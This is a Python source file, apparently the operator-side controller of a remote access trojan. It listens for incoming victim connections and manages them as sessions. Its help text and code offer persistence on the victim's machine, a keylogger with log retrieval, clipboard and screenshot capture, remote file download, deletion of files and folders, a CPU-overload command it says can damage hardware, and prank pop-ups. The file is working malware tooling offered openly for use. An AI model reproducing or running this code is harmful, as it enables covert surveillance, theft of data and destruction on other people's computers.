import threading
import socket as s
from time import sleep
from random import randint

# constant ports:
# by default your localport(change if neaded):
HOST = s.gethostbyname(s.gethostname())
# change port to your need:
PORT = 420
# -------------don't change anything from here if you don't know what you are doing-------------
BUFFER = 4096
ADDR = (HOST, PORT)
FORMAT = "cp850"
DISCONNECT = "!dsc"

server = s.socket(s.AF_INET, s.SOCK_STREAM)
server.bind(ADDR)
# saves active sessions
sessions = {}
session_ids = []

# saves all the command
COMMANDS = ["help", "sessions"]
SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
                    "keybind", "msg", "statlights", "delete", "uninstall", "ls", "whoami", "clipboard", "download",
                    "screenshot", "cpu", "kermit", "url", "rmdir", "background"]


class Commands:
    def __init__(self):
        # the help message
        self.helpmsg = """
        All sessions scripts with a "(p)" at the end need the shell to be installed the ones with the "(t)" can be used without installation
        menu Commands:
            help: shows this message
            back: gets deselects the session and gets you back to them main menu
            sessions: [-s session id] to sellect a session, [-d sesion id] to dellete a session
        
        session Commands|:
        disconnect: Disconnects from the selected shell
        misc:
            tree: Shows the entire dirrectorystructure of the 'C:\\' drive (t)
            install: Makes the shell persistent(starts with the victims computer) (t)
            uninstall: Undos the install command (p)
            disconnect: disconnect and termiate the shel(reconnects when victim reboots if the shell is installed)
        troll:
            matrix: [number of how many times a cmd window will open] opens a big cmd window with random numbers generating(t)
            kill: [pid] kills a running task with given pid (t)
            keybind: [first key] + [seccond key] + [and so on] sends a given keybind(check readme for all special keys) (t)
            msg: [your message] opens notepad and writes the given message (t)
            statlights: [number of blinks] makes the Caps-, Num- and Scrolllock lights blink (t)
            delete: [absolute path to file] deletes the given file (t)
            rmdir: [absolute path to folder] deletes given folder (t)
            cpu: [secconds for how long the cpu will got to 100%] makes the cpu got to 100%(this can break the computer if the cpu runs too hot) (t)
            kermit: just dont ask (t)
            url: [url] open the given url in the default browser (t)
            background: [absolute path to image] changes the background
        Spionage:
            Keylogger: Installs a keylogger, retreive the logs with getlogs (p)
            ps: shows all running processes (t)
            ls: [absolute path] like linux ls command (t)
            whoami: shows the pc and username (t)
            clipboard: shows the clipboard content (t)
            download: [absolute path] downloads the given file (t)
            screenshot: takes a screenshot (t)
            
        """

    # commands in the main menu
    def mainMenu(self, command, args=None):
        if command == "help":
            print(self.helpmsg)
        elif command == "sessions":
            # checks for arguments
            if not args:
                if len(sessions) == 0:
                    print("there are no active sessions")

                else:
                    # gets all the sessions to print them
                    for i in sessions.items():
                        print(f"id: {i[1]['id']}   name: {i[1]['name']}")
            # checks if there are to meny arguments
            elif len(args) > 2:
                print("too many arguments only one is allowed")
            # the select argument to select a session
            elif args[0] == "-s" and len(args) == 2:
                if args[1] in session_ids:
                    sessionId = args[1]
                    sessionInfo = sessions[sessionId]
                    # gets the connection info
                    connectionInfo = sessionInfo["connection"]
                    # changes to session menu
                    print(f"changed to {sessionInfo['name']}")
                    sessionInput(connectionInfo[0], connectionInfo[1], sessionInfo["name"], sessionId)

                else:
                    print("This id is not availible")
            # to dellete a session
            elif args[0] == "-d" and len(args) == 2:
                if args[1] in session_ids:
                    sessionInfo = sessions[args[1]]

                    # confirm if you really dellete the session
                    def confirmation():
                        confirm = input(f"are you sure you want to dellete {sessionInfo['name']}[y|n]")
                        if confirm == "y":
                            sessions.pop(args[1])
                            session_ids.remove(args[1])
                            print(f"delleted {sessionInfo['name']}")
                        elif confirm == "n":
                            mainMenu()
                        else:
                            print("This is not a valid option")
                            confirmation()

                    confirmation()
            else:
                print("you need a  value after your argument!")

    # for commands if a session is sellected
    def session(self, name, conn, addr, message, decId, args=None):
        decId = str(decId)

        # delets the session and all its inforamtion
        def delete():
            sessions.pop(decId)
            session_ids.remove(decId)
            mainMenu()

        # reveives the messages and passes them to the evaluation
        def receiveMessage():
            msg_length = conn.recv(BUFFER).decode(FORMAT)

            if msg_length:
                msg_length = int(msg_length)
                decodetMsg = conn.recv(msg_length).decode(FORMAT)
                return decodetMsg

        # sends the message
        def sendMessage(msg, recv=False):
            # sends the message length
            message_length = str(len(msg)).encode(FORMAT)
            message_length += b" " * (BUFFER - len(message_length))
            # sends the buffered message length
            conn.send(message_length)
            # sends the message
            conn.send(msg.encode(FORMAT))
            # checks if the sended command wants an input
            if msg[2] == "o" or recv:
                returned = receiveMessage()
                return returned
            else:
                return

        # ________________________________________________________________________________________________
        # gets you back to the main menu
        if message == "back":
            mainMenu()
        # ________________________________________________________________________________________________
        # prints the help message
        elif message == "help":
            print(self.helpmsg)
        # ________________________________________________________________________________________________
        # shows the entire dir tree
        elif message == "tree":
            print(sendMessage("c o tree C:\\"))
        # ________________________________________________________________________________________________
        # installs the shell persistently
        elif message == "install":
            with open("extraScripts/plain.py", "r") as file:
                sendMessage(f"x{file.read()}")
        # ________________________________________________________________________________________________
        # is a small bat script which makes random number appear in a cmd screen
        elif message == "matrix":
            if args:
                try:
                    arg = int(args[0])
                except ValueError:
                    print("The argument needs to be a number")
                # gets the username of the computer
                username = sendMessage("c o echo %USERNAME%").strip()
                # sends the matrix.bat script
                with open("extraScripts/matrix.bat", "r") as file:
                    sendMessage(file.read())
                name = receiveMessage()
                # opens the cmd window args[0] times on the pc
                for i in range(int(args[0])):
                    sendMessage(f"c n start cmd /c C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}")
                    sleep(0.1)

            elif not args:
                print("you need an argument type 'help' for more")
            else:
                print("Those are too many arguments only one is allowed type 'help' for more.")
        # ________________________________________________________________________________________________
        # shows all tasks with pid
        elif message == "ps":
            print(sendMessage("c o tasklist"))
        # ________________________________________________________________________________________________
        # kills task with given pid
        elif message == "kill":
            # taskkill /im
            if args:
                try:
                    args = int(args[0])
                except ValueError:
                    print("you need to enter a pid(number)")
                sendMessage(f"c x taskkill /im {args}")
            elif not args:
                print("You need arguments type 'help' for more.")
            else:
                print("Those are too many arguments only one is allowed type 'help' for more.")
        # installs a keylogger on the pc
        elif message == "keylogger":
            with open("extraScripts/keylogger.py", "r") as file:
                sendMessage(file.read())
            if receiveMessage() == "err":
                print("You need to install the shell")
        # ________________________________________________________________________________________________
        # gets the keylogger logs
        elif message == "getlogs":
            sendMessage("r C:/$SysStartup/temp/logs.txt")
            exists = conn.recv(2048)
            if exists != b"err":
                while exists:
                    with open("downloadedLogs.txt", "ab") as file:
                        file.write(exists)
                    if exists != b"done":
                        exists = conn.recv(2048)
                    else:
                        return
            else:
                print("Either wait for a logfile or install the keylogger.")
        # ________________________________________________________________________________________________
        # deletes a file in given path
        elif message == "delete":
            if args:
                message = f"{args[0]}".replace("/", "\\")
                sendMessage(f"c n del /f /Q {message}")
            elif not args:
                print("You need a path type 'help' for more")
            else:
                print("to many arguments type 'help' for more")
        # ________________________________________________________________________________________________
        # uninstalls the whole shell
        elif message == "uninstall":
            user = sendMessage("c o echo %USERNAME%").strip()
            with open("extraScripts/uninstall.bat", "r") as file:
                sendMessage(file.read())
            name = receiveMessage()
            sendMessage(f"c n C:\\Users\\{user}\\AppData\\Local\\Temp\\{name}")
            sendMessage("!dsc")
            conn.close()
            delete()
        # ________________________________________________________________________________________________
        # sends a keybind
        elif message == "keybind":
            special_keys = {"ctrl": "Key.ctrl", "windows": "Key.cmd", "alt": "Key.alt_l", "alt_gr": "Key.alt_gr",
                            "back": "Key.backspace",
                            "caps": "Key.caps_lock", "num": "Key.num_lock", "shift": "Key.shift", "esc": "Key.esc",
                            "enter": "Key.enter",
                            "del": "Key.delete", "insert": "Key.insert", "tab": "Key.tab",
                            "volDown": "Key.media_volume_down", "volUp": "Key.media_volume_up", "f1": "Key.f1", "f2": "Key.f2",
                            "f3": "Key.f3", "f4": "Key.f4", "f5": "Key.f5", "f6": "Key.f6", "f7": "Key.f7", "f8": "Key.f8", "f9": "Key.f9",
                            "f10": "Key.f10", "f11": "Key.f11", "f12": "Key.f12"}
            # checks for arguments
            if args:
                keysStr = args[0]
                rawKeyLst = keysStr.split("+")
                keyLst = []
                # converts all keys into the key classes
                for key in rawKeyLst:
                    if len(key) == 1:
                        keyLst.append(key)
                    else:
                        if key in special_keys:
                            keyLst.append(special_keys[key])
                        else:
                            print(f"{key}, is not a valid key, check the readme file for all the keys")

                sendMessage(f"k b {' '.join(keyLst)}")
            elif not args:
                print("You need to type the keybinds type 'help' for more.")
            else:
                print("Those are to many arguments type 'help' for more.")
        # ________________________________________________________________________________________________
        # types a message into notepad
        elif message == "msg":
            if args:
                msg = " ".join(args)
                print(msg)
                sendMessage("c n notepad.exe")
                sleep(0.5)
                sendMessage(f"k t {msg}")
            else:
                print("You need atleast one letter for the message type 'help' for more")
        # ________________________________________________________________________________________________
        # makes the keyboard status lights blink randomly
        elif message == "statlights":
            if args:
                keys = ["Key.caps_lock", "Key.num_lock", "Key.scroll_lock"]
                for i in range(0, int(args[0])):
                    key = randint(0, 2)
                    sendMessage(f"k s {keys[key]}")
                    sleep(0.2)
            elif not args:
                print("You need to write how many times to let the lights blink type 'help' for more")
            else:
                print("Too many arguments type 'help' for more")
        # ________________________________________________________________________________________________
        # shows the contents of a folder
        elif message == "ls":
            if args:
                path = " ".join(args).replace("/", "\\")
                if " " in path:
                    content = sendMessage(f'c o dir "{path}"')
                    if content == "error":
                        print("The path doesent exist")
                    else:
                        print(content)
                else:
                    content = sendMessage(f'c o dir {path}')
                    if content == "error":
                        print("The path doesent exist")
                    else:
                        print(content)


            elif not args:
                print("You need specify a path type 'help' for more")
        # ________________________________________________________________________________________________
        # basic whoami command
        elif message == "whoami":
            print(sendMessage("c o whoami"))

        # shows whats currently in the clipboard
        elif message == "clipboard":
            print(sendMessage("c o powershell Get-Clipboard"))
        # ________________________________________________________________________________________________
        # downloads a file from given path
        elif message == "download":
            if args:
                path = " ".join(args).replace("\\", "/")
                ending = path[path.rfind("."):]
                drive = path[0].upper()
                path = path[1:]
                path = drive + path
                sendMessage(f'r {path}')
                download = conn.recv(2048)
                name = f"download{randint(0, 1000)}"
                if download == b"err":
                    print("Path could not be found")
                else:
                    while download:
                        if download[-4:] != b"done":
                            with open(f"{name}{ending}", "ab") as file:
                                file.write(download)
                            download = conn.recv(2048)
                        else:
                            return
            elif not args:
                print("You need to specify a path")
            else:
                print("Too many argument type 'help' for more")
        # ________________________________________________________________________________________________
        # takes a screenshot
        elif message == "screenshot":
            usersName = sendMessage("c o echo %USERNAME%").strip()
            with open("extraScripts/screen.py", "r") as file:
                sendMessage(file.read())
            name = receiveMessage()
            sendMessage(f"c n python C:\\Users\\{usersName}\\AppData\\Local\\Temp\\{name}")
            # waits for file creation
            sleep(5)
            # request file
            sendMessage("r C:\\Users\\Public\\monitor-1.png")
            pic = conn.recv(2048)
            name = f"screenshot{randint(0, 1000)}.png"
            while pic:
                if pic[-4:] != b"done":
                    with open(f"{name}", "ab") as file:
                        file.write(pic)
                    pic = conn.recv(2048)
                else:
                    sendMessage("c n del /f /Q C:\\Users\\Public\\monitor-1.png")
                    return
        # ________________________________________________________________________________________________
        # makes the cpu go to 100%
        elif message == "cpu":
            if len(args) == 1:
                try:
                    int(args[0])
                except ValueError:
                    print("You need to specify a number as secconds")

                # changes the timer in the cpu file
                with open("extraScripts/cpu.py", "r") as file:
                    string = file.read().replace("!edit", args[0])
                    with open("extraScripts/cpu.py", "w") as edit:
                        edit.write(string)
                username = sendMessage("c o echo %USERNAME%").strip()

                with open("extraScripts/cpu.py", "r") as send:
                    sendMessage(send.read())
                name = receiveMessage()
                sendMessage(f"c n python C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}")

                # resets the file
                with open("extraScripts/cpu.py", "r") as file:
                    string = file.read().replace(args[0], "!edit")
                    with open("extraScripts/cpu.py", "w") as edit:
                        edit.write(string)
            elif not args:
                print("You need to specify an argument type 'help' for more")
            else:
                print("Too many arguments type 'help' for more")
        # ________________________________________________________________________________________________
        # dont ask
        elif message == "kermit":
            # gets the username for execution of the sendet scripts
            username = sendMessage("c o echo %USERNAME%").strip()
            sendMessage("b .gif")
            name = receiveMessage()
            sleep(0.5)
            # sends the kermit gif
            with open("extraScripts/kermit.gif", "rb") as file:
                string = file.read(2048)
                while string:
                    conn.send(string)
                    string = file.read(2048)
                conn.send(b"done")
            sleep(2)
            path = f"C:/Users/{username}/AppData/Local/Temp/"
            conn.send(path.encode())
            # if everything went well the last 2 scripts will get sent
            if receiveMessage() == "succ":
                with open("extraScripts/kermiterr.vbs", "r") as err:
                    sendMessage(err.read())
                # gets the name of the vbs script
                errname = receiveMessage()
                with open("extraScripts/kermitcmd.bat", "r") as cmd:
                    sendMessage(cmd.read())
                # receives the nam of the cmd scripts
                cmdname = receiveMessage()
                # opens all the scrips
                sendMessage(f"c n C:/Users/{username}/AppData/Local/Temp/{name}")
                sleep(0.2)
                sendMessage(f"c n C:/Users/{username}/AppData/Local/Temp/{name}")
                sleep(0.5)
                for boxes in range(0, 5):
                    sendMessage(f"c n C:/Users/{username}/AppData/Local/Temp/{errname}")
                sleep(0.5)
                for cmds in range(0, 10):
                    sendMessage(f"c n start cmd /c C:/Users/{username}/AppData/Local/Temp/{cmdname}")
                    sleep(0.1)
        # open a url in default browser
        elif message == "url":
            if len(args) == 1:
                sendMessage(f"c n start {args[0]}")
            elif not args:
                print("You need to specify an url")
            else:
                print("Too many arguments type 'help' for more")
        # removes a dirrectoriy
        elif message == "rmdir":
            if len(args) == 1:
                path = args[0].replace("/", "\\")
                if " " in path:
                    sendMessage(f'c n rmdir "{path}" /s /q')
                else:
                    sendMessage(f"c n rmdir {path} /s /q")
            elif not args:
                print("You need to specify a path type 'help' for mora")
            else:
                print("Only one argument is allowed type 'help' for more")
        # ________________________________________________________________________________________________
        # change the background
        elif message == "background":
            if args:
                username = sendMessage("c o echo %USERNAME%").strip()
                path = " ".join(args).replace("\\", "/")
                ending = path[path.rfind("."):]
                sendMessage(f"b {ending}")
                name = receiveMessage()
                with open(f"{path}", "rb") as pic:
                    frag = pic.read(2048)
                    while frag:
                        conn.send(frag)
                        frag = pic.read(2048)
                sleep(0.2)
                conn.send("done".encode())
                conn.send(f"C:\\Users/{username}/AppData/Local/Temp/".encode())
                success = receiveMessage()
                # edit script to the bg path
                with open("extraScripts/bg.py", "r") as file:
                    nString = file.read()
                    string = nString.replace("%CHDIR%", f"C:\\\\\\\\Users\\\\\\\\{username}\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\{name}")
                    with open("extraScripts/bg.py", "w") as edit:
                        edit.write(string)
                # send the changing script
                with open("extraScripts/bg.py", "r") as file:
                    sendMessage(file.read())
                scriptname = receiveMessage()
                with open("extraScripts/bg.py", "w") as file:
                    file.write(nString)
                sleep(5)
                sendMessage(f"c n python C:\\Users\\{username}\\AppData\\Local\\Temp\\{scriptname}")
                return
            elif not args:
                print("you need to specify a path type 'help' for more")
            else:
                print("Too many arguments type 'help' for more")
        # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
        elif message == "disconnect":
            sendMessage("!dsc")
            conn.close()
            delete()


# gets the commands whenn session is sellected
def sessionInput(conn, addr, name, decId):
    """
    This is the menu when a session is sellected
    :param conn: class of the connected clinet
    :param addr: information like ip and connection id
    :param name: name of the session
    :param decId: the id of the session in the list
    """
    decId = str(decId)
    # checks if to shell is still connected
    try:
        command = input(f"command({name}): ")
        commandLst = command.split(" ")
        # checks if the input is in the session commands
        if commandLst[0] in SESSION_COMMANDS:
            scom = Commands()
            if len(commandLst) > 1:
                scom.session(name, conn, addr, commandLst[0], decId, commandLst[1:len(commandLst)])
            else:
                scom.session(name, conn, addr, commandLst[0], decId)
            sessionInput(conn, addr, name, decId)

        elif commandLst[0] in COMMANDS:
            print(f"{command} is only availible in the main menu!")
            sessionInput(conn, addr, name, decId)

        else:
            sessionInput(conn, addr, name, decId)
    except (ConnectionResetError, ConnectionAbortedError):
        sessions.pop(decId)
        session_ids.remove(decId)
        print("The client is no longer connected")
        mainMenu()


# to acces everything not related to a session
def mainMenu():
    command = input("Command:")

    # splits the command to filter out extra options
    commandLst = command.split(" ")

    # checks if the command exist
    if commandLst[0] in COMMANDS:
        com = Commands()
        # checks if there are arguments
        if len(commandLst) > 1:
            com.mainMenu(commandLst[0], commandLst[1:len(commandLst)])
        else:
            com.mainMenu(commandLst[0])
        mainMenu()

    elif commandLst[0] in SESSION_COMMANDS:
        print(f"{command} is only availible if you have a session sellected!")
        mainMenu()

    else:
        print(f"'{command}' is not a known command use 'help' for more!")
        mainMenu()


# starts the listening for a connection ip and port can be changed on top of the script
def startListening():
    server.listen()
    while True:
        conn, addr = server.accept()
        id_num = len(sessions)
        sessions.update({str(id_num): {"id": f"{id_num}", "name": f"session{id_num}", "connection": (conn, addr),
                                       "pyinstall": False}})
        session_ids.append(str(id_num))
        print(f"[CONNECTION] New connection from {addr[0]}")
        startListening()


listening = threading.Thread(target=startListening)
menues = threading.Thread(target=mainMenu)

listening.start()
print(f"[SERVER] Server started and now listening on {HOST}:{PORT}\n")
menues.start()
